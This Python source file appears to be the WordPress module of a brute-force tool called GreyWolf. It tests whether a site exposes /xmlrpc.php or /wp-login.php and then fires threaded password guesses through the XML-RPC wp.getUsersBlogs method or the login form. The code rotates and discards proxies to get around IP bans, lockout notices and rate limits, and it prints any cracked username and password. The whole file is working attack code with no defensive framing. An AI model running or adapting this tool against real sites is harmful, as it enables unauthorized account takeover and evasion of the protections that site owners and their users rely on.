#python imports
import threading
import random
import sys
from colorama import init,Fore
init()
from bs4 import BeautifulSoup
import requests

#greywolf imports
from lib.brute import Brute


class Wordpress(Brute):

    def __init__(self,address,usernames,passwordPath,proxyPath = None):
        super().__init__(address,usernames,passwordPath,proxyPath)

        self.cookies = {
            "cookielawinfo-checkbox-necessary":"yes",
            "cookielawinfo-checkbox-non-necessary":"yes",
            "_ga":"GA1.2.1541860671.1611330358",
            "_gid":"GA1.2.1655560151.1611330358",
            "viewed_cookie_policy":"yes",
            "wordpress_test_cookie":"WP%20Cookie%20check"}

        self.triedPasswords = 0
        self.foundPassword = None
        self.proxyErrorShown = False


    def getProxy(self):
        if len(self.proxies) > 0:
            return random.choice(self.proxies)

        else:
            if not self.proxyErrorShown:
                self.proxyErrorShown = True
                self.displayMessage("Be aware! You have no proxies or all of your proxies are banned!")
        return None


    def deleteProxy(self, proxy, exceptionMessage):
        if "Failed to establish a new connection" in exceptionMessage:
            #Since we are requesting with multiple threads, some requests can't connect and it returns a proxy error.
            #That means if we remove proxy in all proxy exceptions, in some cases we will delete good proxies too.
            #Sometimes dead proxies return this error too, but its worth it to pass this exception without deleting proxy.
            pass
        else:
            try:
                self.proxies.remove(proxy)
            except:
                pass


    def createPayload(self,username,password, method):
        if method == "XML":
            return "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>" + username + "</string></value></param><param><value><string>" + password + "</string></value></param></params></methodCall>"

        else: #method == "WPLOGIN":
            return {
                "log": username,
                "wp-submit": "Login",
                "testcookie": "1",
                "pwd": password}


    def reAttempt(self, username, password, method):
        if method == "XML":
            # self.executor.submit(self.XMLAttempt, username, password, self.getProxy())
            t = threading.Thread(target=self.XMLAttempt, args=[username, password, self.getProxy()])
            t.start()

        else: #method == "WPLOGIN"
            # self.executor.submit(self.WPLoginAttempt,username,password,self.getProxy())
            t = threading.Thread(target=self.WPLoginAttempt, args=[username, password, self.getProxy()])
            t.start()


    def XMLTest(self,proxy=None):
        print(Fore.CYAN + "[*] " + Fore.WHITE + "Testing /xmlrpc.php..")
        try:
            req = requests.get(self.address + "/xmlrpc.php",headers = self.createHeaders(),proxies=proxy,allow_redirects=False)
            if "XML-RPC server accepts POST requests only." in req.text:
                print(Fore.CYAN + "[+] XML Login on.")
                return True
            elif req.status_code == 404:
                print(Fore.RED + "[-] XML Login is off, if you now admin panel, go with it.")
                return False
            else:
                print(Fore.RED + "[-] Request not succesfull, HTTP code is ",req.status_code)
                return False

        except requests.exceptions.ProxyError as e:
            print(Fore.YELLOW + "[-] Proxy error, changing proxy..")
            self.proxies.remove(proxy)
            return self.XMLTest(self.address)

        except:
            print(Fore.RED + f"[-] An error occured while requesting {self.address + '/xmlrpc.php'}")
            return self.XMLTest(self.address)


    def WPLoginTest(self, proxy=None):
            try:
                req = requests.get(self.address + "/wp-login.php", headers=self.createHeaders(), proxies=proxy,allow_redirects=False)
                if req.status_code == 200:
                    print(Fore.CYAN + "[+]/wp-login.php is on.")
                    return True
                elif req.status_code == 404:
                    print(Fore.RED + "[-]/wp-login.php is off, if you now admin panel, go with it.")
                    return False
                else:
                    print(Fore.RED + "[-]Request not succesfull, HTTP code is ", req.status_code)
                    return False

            except requests.exceptions.ProxyError as e:
                print(Fore.YELLOW + "[-]Proxy error, changing proxy..")
                self.proxies.remove(proxy)
                return self.XMLTest(self.address, random.choice(self.proxies))

            except:
                print(Fore.RED + f"[-]An error occured while requesting {self.address + '/wp-login.php'}")


    def WPLoginAttempt(self,username,password,proxy=None):
        if not self.foundPassword:
            session = self.getSession()
            try:
                with session.post(self.address,headers=self.createHeaders(),data=self.createPayload(username,password,"WPLOGIN"),cookies=self.cookies,proxies=proxy,stream=True) as req:
                    if not self.foundPassword:
                        self.analyzeWPLoginResponse(req.status_code, req.text, username, password)


            except requests.exceptions.ProxyError as exceptionMessage:
                self.deleteProxy(proxy, str(exceptionMessage))
                self.reAttempt(username, password, "WPLOGIN")

            except Exception as e:
                # print(e)
                self.reAttempt(username, password, "WPLOGIN")


    def XMLAttempt(self,username,password,proxy=None):
        if not self.foundPassword:
            session = self.getSession()
            try:
                with session.post(self.address,data=self.createPayload(username,password, "XML"),proxies=proxy,stream=True) as req:
                    if not self.foundPassword:
                        if req.status_code != 405:
                            return self.analyzeXMLResponse(req.status_code, req.text, username, password)
                        else:
                            self.displayMessage(error = "Website doesn't allow to GreyWolf to send data..")

            except requests.exceptions.ProxyError as exceptionMessage:
                self.deleteProxy(proxy, str(exceptionMessage))
                self.reAttempt(username, password, "XML")

            except:
                self.reAttempt(username, password, "XML")


    def analyzeXMLResponse(self,httpCode, text, username, password):
        try:
            if httpCode != 429 or httpCode != 500:
                soup = BeautifulSoup(text, "html.parser")
                if "isAdmin" in text: #if password is successful
                    self.foundPassword = password
                    print("\n\n")
                    for i in range(5):
                        print("\n" + Fore.GREEN + f"[+]      )-> Found Account! Username:{username} Password:{password}")
                    return

                elif "faultString" in text: #if password is not successful
                    if "remaining" in text: #if there is a limited attempt limit per proxy/ip
                        self.triedPasswords += 1
                        return self.displayMessage(unsuccessful=f"{self.triedPasswords}   {username}:{password}  Limited attempts remaining.")

                    elif "You have exceeded the login limit.  Please wait a few minutes and try again." in text:
                        self.displayMessage(error = f"{username}:{password}  " + soup.find("string").text)
                        return self.reAttempt(username, password, "XML")

                    elif "Too many failed login attempts. Please try again in 20 minutes." in text:
                        self.displayMessage(error="This ip address has been banned!")
                        self.reAttempt(username, password, "XML")
                        raise requests.exceptions.ProxyError #remove proxy

                    else: #if there is just a normal unsuccesful message
                        self.triedPasswords += 1

                    self.displayMessage(unsuccessful=f"{self.triedPasswords}  {username}:{password}  " + soup.find("string").text + f" {len(self.proxies)}")

                elif "Service Unavailable" in text:
                    self.displayMessage(error = "Website service unavailable!")
                    return self.reAttempt(username, password, "XML")

                elif "The remote host or network may be down. Please try the request again." in text:
                    self.displayMessage(error = "Website down!")
                    return self.reAttempt(username, password, "XML")

                elif "well-known/captcha/" in text:
                    self.displayMessage(error = f"Captcha! {password}")
                    return self.reAttempt(username, password, "XML")

                else:
                    if len(text) > 0:
                        self.displayMessage(error="Unknown response.. Reattempting..")
                        return self.reAttempt(username, password, "XML")
                    else: #if length of response == 0, that means our proxy/ip has been banned.
                        self.reAttempt(username, password, "XML")
                        raise requests.exceptions.ProxyError #remove proxy

            elif httpCode == 429:
                self.displayMessage(error = "Too many requests! Website is blocking reqquests!")
                self.reAttempt(username, password, "XML")

            elif httpCode == 500:
                self.displayMessage(error = "Website returns unknown error!")
                self.reAttempt(username, password, "XML")

        except Exception as e:
            print(e)


    def analyzeWPLoginResponse(self,httpCode, text, username, password):

        try:
            if httpCode == 200: #if request is successful
                soup = BeautifulSoup(text, "html.parser")
                if '<div id="wpbody" role="main">' in text: #if password is successful
                    self.foundPassword = password
                    for i in range(5):
                        print("\n")
                        print(Fore.GREEN + f"[+]      )-> Found Account! Username:{username} Password:{password}")

                elif soup.find("div", attrs={"id": "login_error"}): #if there is a unsuccessful message
                    if "You have exceeded the login limit.  Please wait a few minutes and try again." in text:
                        self.displayMessage(error = f"{self.triedPasswords}  {username}:{password}  "+ soup.find("div",attrs={"id": "login_error"}).text.strip())

                    elif "remaining" in text: # 3 attempt remaining, 2 attempts remaining etc..
                        self.triedPasswords += 1
                        self.displayMessage(unsuccessful = f"{self.triedPasswords}  {username}:{password}   Limited attempt remaining.")

                    elif "20" in soup.find("div",attrs={"id": "login_error"}):
                        self.displayMessage(error = f"This ip address has been banned for 20 minutes!")
                        self.reAttempt(username, password,"WPLOGIN")
                        raise requests.exceptions.ProxyError

                    else:
                        self.triedPasswords += 1
                        self.displayMessage(unsuccessful=f"{self.triedPasswords}  {username}:{password}  " + soup.find("div",attrs={"id": "login_error"}).text.strip() + "   " + str(len(self.proxies)))

                elif "well-known/captcha/" in text: #if there is a captcha in the login page
                    self.displayMessage(error = "Captcha!")
                    self.reAttempt(username,password,"WPLOGIN")

                elif "<noscript>" in text:
                    #javascript protection, may be cloudproxy_uuid or something.
                    self.displayMessage(error="Page requires Javascript!Can not run the brute forcer!")
                    self.displayMessage(error="Please enter the correct/full url with correct 'http' or'https' and correct 'www'..")

                else:
                    self.displayMessage(error="Unknown response.. Reattempting..")
                    self.reAttempt(username,password,"WPLOGIN")

            else:  # if request is not succesfull give information and reattempt
                if httpCode == 403: #if website is banned us
                    raise requests.exceptions.ProxyError  # remove proxy

                elif httpCode == 405:
                    self.displayMessage(error="Website doesn't allows to GreyWolf to send data")

                elif httpCode == 429:
                    self.displayMessage(error="Too many requests! Website is blocking request!")
                    self.reAttempt(username,password,"WPLOGIN")

                elif httpCode == 500:
                    self.displayMessage(error="Unknown error with website server!")
                    self.reAttempt(username,password,"WPLOGIN")

                elif httpCode == 503:
                    self.displayMessage(error="Website service unavailable!")
                    self.reAttempt(username,password,"WPLOGIN")

                else:
                    self.displayMessage(error=f"Unknown HTTP Response ({httpCode}), reattempting..")
                    self.reAttempt(username,password,"WPLOGIN")

        except Exception as e:
            print(e)


    def displayMessage(self,error=None,unsuccessful=None):
        if error:
            sys.stdout.write("\r" + Fore.RED + "[ERROR] )-> " + error + "\n")
        if unsuccessful:
            sys.stdout.write("\r" + Fore.YELLOW + "[-] )-> " + unsuccessful + "\n")


    def testMethods(self):
        if self.XMLTest():
            self.address = self.address + "/xmlrpc.php"
            return "XML"

        elif self.WPLoginTest():
            self.address = self.address + "/wp-login.php"
            return "WPLOGIN"

        else:
            return "UNKNOWN"


    def ATTACK(self,method):
        if method == "XML":
            for username in self.usernames:
                for password in self.passwords:
                    self.executor.submit(self.XMLAttempt, username, password, self.getProxy())

        else: #method == "WPLOGIN"
            for username in self.usernames:
                for password in self.passwords:
                    self.executor.submit(self.WPLoginAttempt, username, password, self.getProxy())


